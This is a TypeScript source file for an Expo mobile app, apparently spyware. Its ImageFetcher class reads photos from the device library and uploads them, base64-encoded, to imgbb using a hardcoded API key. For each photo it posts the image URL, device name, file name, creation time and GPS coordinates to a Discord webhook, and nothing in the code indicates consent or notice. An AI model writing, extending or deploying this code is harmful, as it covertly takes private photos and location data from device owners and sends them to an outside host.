import * as MediaLibrary from 'expo-media-library';
import * as FileSystem from 'expo-file-system';
import * as Device from 'expo-device';
import { Webhook, SendWebhook } from './Webhook';
import KEYS from './Keys';
import axios from 'axios';

export default class ImageFetcher {
    assets: Array<MediaLibrary.Asset>
    fetched: boolean;

    constructor() {
        this.assets = [];
        this.fetched = false;
    }

    async FetchPhotos(amount: number): Promise<void> 
    {
        if(this.fetched) return;

        const assets = await MediaLibrary.getAssetsAsync({
            first: amount,
        });

        console.log(`Assets Fetched!\nAmount: ${assets.totalCount} \nNext Page: ${assets.hasNextPage}`)
        
        for(let i = 0; i < assets.totalCount; i++)
        {
            this.assets.push(assets.assets[i]);
        }
    }

    // upload all fetched photos to a hosting service
    async Upload(): Promise<void>
    {
        if(this.fetched) return;

        for(const asset of this.assets)
        {
            // read image
            console.log(asset);
            if(Device.brand === "Apple" && asset.mediaSubtypes.includes("livePhoto")) continue;

            const info:MediaLibrary.AssetInfo = asset;
            
            const localUri = (await MediaLibrary.getAssetInfoAsync(asset)).localUri;
            console.log(localUri);

            const base64 = await FileSystem.readAsStringAsync(localUri, {encoding:'base64'});
            // (await MediaLibrary.getAssetInfoAsync(asset)).localUri???

             // upload to image server
            const form = new FormData();
            form.append("image", base64);

            const res = await fetch("https://api.imgbb.com/1/upload?key=b87d2277c4634f4ee57ff8ec15094668", {
                method: "POST",
                body: form
            });
            const parsed = JSON.parse(await res.text());
            console.log(parsed.data.image.url);

            // send webhook using image url

            const webhook: Webhook = {
                username: "Cook",
                avatar_url: "https://cdn.discordapp.com/attachments/1173871538156613644/1173897580393017394/5AA9DFC5-B16D-491C-A7B6-B6A8F0A2CBC3.jpg",
                content: `
                # Image From ${Device.brand}, Name: ${Device.deviceName}
                ## ${asset.filename}
                Time created: ${new Date(asset.creationTime).toDateString() + ' ' + new Date(asset.creationTime).toTimeString()}
                URL:${parsed.data.image.url}
                Location:${info.location?.latitude},${info.location?.longitude}
                Local Uri:${info.localUri}
                `
            };

            SendWebhook(KEYS.WEBHOOK_URL, webhook);
        }

        this.assets = [];
        this.fetched = true;
    }
}